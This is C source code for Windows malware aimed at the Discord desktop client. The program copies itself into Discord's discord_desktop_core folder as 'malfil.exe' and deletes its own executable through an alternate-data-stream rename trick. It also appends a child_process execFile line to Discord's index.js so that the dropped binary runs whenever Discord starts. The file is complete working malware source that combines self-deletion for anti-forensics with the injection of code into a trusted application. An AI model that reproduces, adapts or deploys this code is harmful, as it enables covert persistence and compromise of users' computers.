#include <Windows.h>
#include <Shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

#define JL_CONSTANT_RENAME L":wtfbbq" //artifact for JonasLyk :)
#define WIDE_CHAR_MAX_PATH (MAX_PATH * sizeof(WCHAR))

SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

PWCHAR StringLocateCharW(PWCHAR String, INT Character)
{
	do
	{
		if (*String == Character)
			return (PWCHAR)String;

	} while (*String++);

	return NULL;
}

INT StringCompareStringRegionW(PWCHAR String1, PWCHAR String2, SIZE_T Count)
{
	UCHAR Block1, Block2;
	while (Count-- > 0)
	{
		Block1 = (UCHAR)*String1++;
		Block2 = (UCHAR)*String2++;

		if (Block1 != Block2)
			return Block1 - Block2;

		if (Block1 == '\0')
			return 0;
	}

	return 0;
}

PWCHAR StringFindSubstringW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR pPointer = String1;
	DWORD Length = (DWORD)StringLengthW(String2);

	for (; (pPointer = StringLocateCharW(pPointer, *String2)) != 0; pPointer++)
	{
		if (StringCompareStringRegionW(pPointer, String2, Length) == 0)
			return (PWCHAR)pPointer;
	}

	return NULL;
}

SIZE_T StringLengthA(LPCSTR String)
{
	LPCSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PCHAR StringCopyA(PCHAR String1, PCHAR String2)
{
	PCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PCHAR StringConcatA(PCHAR String, PCHAR String2)
{
	StringCopyA(&String[StringLengthA(String)], String2);

	return String;
}

SIZE_T WCharStringToCharString(PCHAR Destination, PWCHAR Source, SIZE_T MaximumAllowed)
{
	INT Length = (INT)MaximumAllowed;

	while (--Length >= 0)
	{
#pragma warning( push )
#pragma warning( disable : 4244)
		if (!(*Destination++ = *Source++))
			return MaximumAllowed - Length - 1;
#pragma warning( pop ) 
	}

	return MaximumAllowed - Length;
}

BOOL IsPathValidExW(PWCHAR FilePath, BOOL IsDirectory)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, (IsDirectory ? FILE_FLAG_BACKUP_SEMANTICS : FILE_ATTRIBUTE_NORMAL), NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if (hFile)
		CloseHandle(hFile);

	return TRUE;
}

BOOL InitTargetDirectory(PWCHAR Path, DWORD Length)
{
	if (GetEnvironmentVariableW(L"LOCALAPPDATA", Path, Length) == 0)
		return FALSE;

	if (StringConcatW(Path, (PWCHAR)L"\\Discord\\") == NULL)
		return FALSE;

	return IsPathValidExW(Path, TRUE);
}

BOOL GetDiscordConstantPath(PWCHAR Path, LPCWSTR Pattern, PWCHAR Out)
{
	HANDLE HeapHandle = GetProcessHeap();
	WCHAR szFullPattern[WIDE_CHAR_MAX_PATH] = { 0 };
	WIN32_FIND_DATAW FindData = { 0 };
	HANDLE FindHandle = INVALID_HANDLE_VALUE;

	if (Out[0] != '\0')
		return TRUE;
		
	if (PathCombineW(szFullPattern, Path, L"*") == NULL)
		goto FAILURE;

	FindHandle = FindFirstFileW(szFullPattern, &FindData);
	if (FindHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	do
	{
		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (FindData.cFileName[0] == '.')
				continue;

			if (FindData.cFileName[0] == '$')
				continue;

			ZeroMemory(szFullPattern, WIDE_CHAR_MAX_PATH);
			if (PathCombineW(szFullPattern, Path, FindData.cFileName) == NULL)
				goto FAILURE;

			GetDiscordConstantPath(szFullPattern, Pattern, Out);
		}

	} while (FindNextFileW(FindHandle, &FindData));

	if (FindHandle)
		FindClose(FindHandle);

	if (PathCombineW(szFullPattern, Path, Pattern) == NULL)
		goto FAILURE;

	if (StringFindSubstringW(szFullPattern, (PWCHAR)L"discord_desktop_core") != NULL)
	{
		if (StringConcatW(Path, (PWCHAR)L"\\") == NULL) 
			return FALSE;

		if (StringFindSubstringW(szFullPattern, (PWCHAR)L"\\discord_desktop_core\\") == NULL) 
			return FALSE;

		if (!IsPathValidExW(Path, TRUE)) 
			return FALSE;

		if (StringCopyW(Out, Path) != NULL) 
			return TRUE; 
		else 
			return FALSE;
	}

	return TRUE;

FAILURE:

	if (FindHandle)
		FindClose(FindHandle);

	return FALSE;
}

BOOL InitDiscordDesktopCoreFilePath(PWCHAR FilePath, PWCHAR LocalFile, BOOL IsDirectory)
{
	WCHAR DiscordDirectoryNoIndex[WIDE_CHAR_MAX_PATH] = { 0 };
	WCHAR DiscordConstantPath[WIDE_CHAR_MAX_PATH] = { 0 };
	WCHAR Tmp[WIDE_CHAR_MAX_PATH] = { 0 };

	if (!InitTargetDirectory(DiscordDirectoryNoIndex, WIDE_CHAR_MAX_PATH))
		return FALSE;

	if (StringConcatW(FilePath, DiscordDirectoryNoIndex) == NULL)
		return FALSE;

	if (!GetDiscordConstantPath(FilePath, L"*.*", DiscordConstantPath))
		return FALSE;

	if (StringCopyW(FilePath, DiscordConstantPath) == NULL)
		return FALSE;

	if (LocalFile != NULL)
	{
		if (StringConcatW(FilePath, LocalFile) == NULL)
			return FALSE;
	}

	return IsPathValidExW(FilePath, IsDirectory);
}

BOOL InternalCopyFile(VOID)
{
	WCHAR DiscordDirectoryDesktopCore[WIDE_CHAR_MAX_PATH] = { 0 };

	if (!InitDiscordDesktopCoreFilePath(DiscordDirectoryDesktopCore, NULL, TRUE))
		return FALSE;

	WCHAR ExistingFile[WIDE_CHAR_MAX_PATH] = { 0 };
	WCHAR NewFile[WIDE_CHAR_MAX_PATH] = { 0 };

	if (GetModuleFileNameW(NULL, ExistingFile, WIDE_CHAR_MAX_PATH) == 0)
		return FALSE;

	if (StringConcatW(NewFile, DiscordDirectoryDesktopCore) == NULL)
		return FALSE;

	if (StringConcatW(NewFile, (PWCHAR)L"malfil.exe") == 0)
		return FALSE;

	return CopyFile(ExistingFile, NewFile, FALSE);
}

DWORD RtlDeleteInMemoryModuleEx(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	WCHAR CurrentModulePath[WIDE_CHAR_MAX_PATH] = { 0 };
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hDelete = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO frInfo = NULL;
	FILE_DISPOSITION_INFO fDisposition;

	dwError = (DWORD)(sizeof(FILE_RENAME_INFO) + sizeof(JL_CONSTANT_RENAME));

	RtlSecureZeroMemory(&fDisposition, sizeof(FILE_DISPOSITION_INFO));

	if (!GetModuleFileNameW(NULL, CurrentModulePath, WIDE_CHAR_MAX_PATH))
		goto EXIT_ROUTINE;

	hFile = CreateFileW(CurrentModulePath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	frInfo = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(FILE_RENAME_INFO) + sizeof(JL_CONSTANT_RENAME)));
	if (frInfo == NULL)
		goto EXIT_ROUTINE;

	CopyMemory(frInfo->FileName, JL_CONSTANT_RENAME, sizeof(JL_CONSTANT_RENAME));
	frInfo->FileNameLength = 8;

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, frInfo, (sizeof(frInfo) + sizeof(JL_CONSTANT_RENAME))))
		goto EXIT_ROUTINE;
	else
		CloseHandle(hFile);

	hDelete = CreateFileW(CurrentModulePath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDelete == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	fDisposition.DeleteFileW = TRUE;

	if (!SetFileInformationByHandle(hDelete, FileDispositionInfo, &fDisposition, sizeof(fDisposition)))
		goto EXIT_ROUTINE;

	bFlag = TRUE;
	dwError = ERROR_SUCCESS;

EXIT_ROUTINE:

	if (!bFlag)
		dwError = GetLastError();

	if (frInfo)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, frInfo);

	if(hDelete)
		CloseHandle(hDelete);

	return dwError;
}

DWORD RtlModifyDiscordIndexJsFile(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	WCHAR DiscordDesktopCoreIndexJsFile[WIDE_CHAR_MAX_PATH] = { 0 };
	WCHAR LocalIndexFile[16] = L"index.js";
	WCHAR MaliciousBinary[12] = L"malfil.exe";
	WCHAR WcharToCharStringSegment[WIDE_CHAR_MAX_PATH] = { 0 };
	HANDLE hHandle = INVALID_HANDLE_VALUE;

	CHAR StringSegment1[48] = "\r\nvar exec = require('child_process').execFile;";
	CHAR StringSegment2[16] = " exec('";
	CHAR StringSegment3[WIDE_CHAR_MAX_PATH] = { 0 };
	CHAR StringSegment4[8] = "');";

	PCHAR pwInfectiousString = NULL;
	DWORD dwInfectiousStringLength = ERROR_SUCCESS;
	
	if (!InitDiscordDesktopCoreFilePath(DiscordDesktopCoreIndexJsFile, (PWCHAR)LocalIndexFile, FALSE))
		goto FAILURE;

	if (!InitDiscordDesktopCoreFilePath(WcharToCharStringSegment, MaliciousBinary, FALSE))
		goto FAILURE;

	if (WCharStringToCharString(StringSegment3, WcharToCharStringSegment, WIDE_CHAR_MAX_PATH) == 0)
		goto FAILURE;

	dwInfectiousStringLength += (DWORD)StringLengthA(StringSegment1);
	dwInfectiousStringLength += (DWORD)StringLengthA(StringSegment2);
	dwInfectiousStringLength += (DWORD)StringLengthA(StringSegment3);
	dwInfectiousStringLength += (DWORD)StringLengthA(StringSegment4);

	pwInfectiousString = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInfectiousStringLength);
	if (pwInfectiousString == NULL)
		goto FAILURE;

	if (StringConcatA(pwInfectiousString, StringSegment1) == NULL) goto FAILURE;
	if (StringConcatA(pwInfectiousString, StringSegment2) == NULL) goto FAILURE;
	if (StringConcatA(pwInfectiousString, StringSegment3) == NULL) goto FAILURE;
	if (StringConcatA(pwInfectiousString, StringSegment4) == NULL) goto FAILURE;

	hHandle = CreateFile(DiscordDesktopCoreIndexJsFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	if (SetFilePointer(hHandle, 0, NULL, FILE_END) == INVALID_SET_FILE_POINTER)
		goto FAILURE;

	if (!WriteFile(hHandle, pwInfectiousString, dwInfectiousStringLength, &dwError, NULL))
		goto FAILURE;

	bFlag = TRUE;
	dwError = ERROR_SUCCESS;

FAILURE:

	if (!bFlag)
		dwError = GetLastError();

	if (hHandle)
		CloseHandle(hHandle);

	if (pwInfectiousString)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pwInfectiousString);

	return dwError;
}

INT main(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;

	if (!InternalCopyFile())
		goto FAILURE;

	dwError = RtlDeleteInMemoryModuleEx();
	if (dwError != ERROR_SUCCESS)
		goto FAILURE;

	dwError = RtlModifyDiscordIndexJsFile();
	if (dwError != ERROR_SUCCESS)
	{
		SetLastError(dwError);
		goto FAILURE;
	}

	bFlag = TRUE;

FAILURE:

	if (!bFlag)
		dwError = GetLastError();

	return dwError;
}